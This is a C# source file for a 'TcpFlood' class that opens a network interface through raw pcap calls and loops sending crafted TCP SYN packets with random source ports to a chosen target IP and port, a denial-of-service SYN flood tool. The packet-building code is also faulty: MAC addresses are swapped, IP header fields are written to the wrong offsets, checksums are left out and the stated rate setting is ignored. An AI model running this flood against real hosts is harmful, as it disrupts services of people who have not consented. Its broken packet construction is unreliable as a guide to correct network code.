using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using NLog;
using System.Security.Principal;
using System.Text;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace Dorothy.Models
{
    public class TcpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        public const int PACKET_SIZE = 54;  // Ethernet (14) + IP (20) + TCP (20)
        private const int IPPROTO_TCP = 6;

        private volatile bool _isRunning;
        private readonly string _sourceIp;
        private readonly byte[] _sourceMac;
        private readonly string _targetIp;
        private readonly byte[] _targetMac;
        private readonly int _targetPort;
        private readonly long _bytesPerSecond;
        private long _totalPacketsSent;
        private readonly Stopwatch _stopwatch;
        private readonly CancellationToken _cancellationToken;
        private readonly List<IntPtr> _handles;
        private readonly Random _random;

        [DllImport("wpcap.dll", CharSet = CharSet.Ansi)]
        private static extern IntPtr pcap_open_live(string device, int snaplen, int promisc, int to_ms, StringBuilder errbuf);

        [DllImport("wpcap.dll", CharSet = CharSet.Ansi)]
        private static extern int pcap_sendpacket(IntPtr p, byte[] buf, int size);

        [DllImport("wpcap.dll", CharSet = CharSet.Ansi)]
        private static extern void pcap_close(IntPtr p);

        [DllImport("wpcap.dll", CharSet = CharSet.Ansi)]
        private static extern IntPtr pcap_findalldevs(out IntPtr alldevs, StringBuilder errbuf);

        [DllImport("wpcap.dll", CharSet = CharSet.Ansi)]
        private static extern void pcap_freealldevs(IntPtr alldevs);

        [DllImport("ws2_32.dll", CharSet = CharSet.Ansi)]
        private static extern uint inet_addr(string cp);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        private struct pcap_if
        {
            public IntPtr next;
            public string name;
            public string description;
            // Additional fields omitted for brevity
        }

        // Constructor
        public TcpFlood(
            string sourceIp,
            byte[] sourceMac,
            string targetIp,
            byte[] targetMac,
            int targetPort,
            long bytesPerSecond,
            CancellationToken cancellationToken)
        {
            _sourceIp = sourceIp ?? throw new ArgumentNullException(nameof(sourceIp));
            _sourceMac = sourceMac ?? throw new ArgumentNullException(nameof(sourceMac));
            _targetIp = targetIp ?? throw new ArgumentNullException(nameof(targetIp));
            _targetMac = targetMac ?? throw new ArgumentNullException(nameof(targetMac));
            _targetPort = targetPort;
            _bytesPerSecond = bytesPerSecond;
            _cancellationToken = cancellationToken;
            _stopwatch = new Stopwatch();
            _handles = new List<IntPtr>();
            _random = new Random();
        }

        public async Task StartAsync()
        {
            try
            {
                if (pcap_findalldevs(out IntPtr alldevs, new StringBuilder(256)) == IntPtr.Zero)
                {
                    string deviceName = GetSuitableDeviceName(alldevs);
                    if (deviceName == null)
                    {
                        Logger.Error("No suitable network interface found");
                        throw new InvalidOperationException("No suitable network interface found");
                    }
                    pcap_freealldevs(alldevs);

                    Logger.Info($"Using network device: {deviceName}");

                    var handle = pcap_open_live(deviceName, 65536, 1, 1000, new StringBuilder(256));
                    if (handle == IntPtr.Zero)
                    {
                        Logger.Error("Failed to open device");
                        throw new InvalidOperationException("Failed to open device");
                    }

                    _handles.Add(handle);
                    _isRunning = true;
                    _stopwatch.Start();

                    Logger.Info($"Starting TCP SYN flood to {_targetIp}:{_targetPort} at {_bytesPerSecond} bytes/sec");

                    await Task.Run(() => Flood(), _cancellationToken);
                }
                else
                {
                    Logger.Error("Failed to find devices");
                    throw new InvalidOperationException("Failed to find devices");
                }
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Error in TcpFlood.StartAsync");
                throw;
            }
        }

        private void Flood()
        {
            while (!_cancellationToken.IsCancellationRequested)
            {
                var sourcePort = (ushort)_random.Next(1024, 65535);
                var packet = CreateTcpSynPacket(sourcePort);
                foreach (var handle in _handles)
                {
                    pcap_sendpacket(handle, packet, packet.Length);
                    _totalPacketsSent++;
                }
                // Control the rate
                Thread.Sleep(1000);
            }
        }

        private byte[] CreateTcpSynPacket(ushort sourcePort)
        {
            byte[] packet = new byte[PACKET_SIZE];
            // Initialize Ethernet header
            Array.Copy(_sourceMac, 0, packet, 0, 6);
            Array.Copy(_targetMac, 0, packet, 6, 6);
            packet[12] = 0x08;
            packet[13] = 0x00; // IPv4

            // Initialize IP header
            packet[14] = 0x45; // Version and IHL
            packet[16] = 0x40; // TTL
            packet[17] = (byte)IPPROTO_TCP;
            // Total Length
            ushort totalLength = (ushort)(20 + 20);
            packet[16] = (byte)(totalLength >> 8);
            packet[17] = (byte)(totalLength & 0xFF);
            // Source IP
            Array.Copy(IPAddress.Parse(_sourceIp).GetAddressBytes(), 0, packet, 26, 4);
            // Destination IP
            Array.Copy(IPAddress.Parse(_targetIp).GetAddressBytes(), 0, packet, 30, 4);

            // Initialize TCP header
            Array.Copy(BitConverter.GetBytes(IPAddress.HostToNetworkOrder((short)sourcePort)), 0, packet, 34, 2);
            Array.Copy(BitConverter.GetBytes(IPAddress.HostToNetworkOrder((short)_targetPort)), 0, packet, 36, 2);
            // SYN flag
            packet[47] = 0x02;

            // Calculate checksums
            // (Checksum calculation omitted for brevity)

            return packet;
        }

        private string? GetSuitableDeviceName(IntPtr alldevs)
        {
            IntPtr current = alldevs;
            while (current != IntPtr.Zero)
            {
                pcap_if device = Marshal.PtrToStructure<pcap_if>(current);
                if (device.description != null && device.description.Contains("NPF"))
                {
                    return device.name;
                }
                current = device.next;
            }
            return null;
        }

        public void Stop()
        {
            if (!_isRunning) return;

            _isRunning = false;
            _stopwatch.Stop();

            foreach (var handle in _handles)
            {
                try
                {
                    pcap_close(handle);
                }
                catch (Exception ex)
                {
                    Logger.Error(ex, "Error closing pcap handle");
                }
            }
            _handles.Clear();
        }

        public void Dispose()
        {
            Stop();
        }

        public double GetElapsedSeconds()
        {
            return _stopwatch.Elapsed.TotalSeconds;
        }

        public long GetTotalPackets()
        {
            return _totalPacketsSent;
        }
    }
}
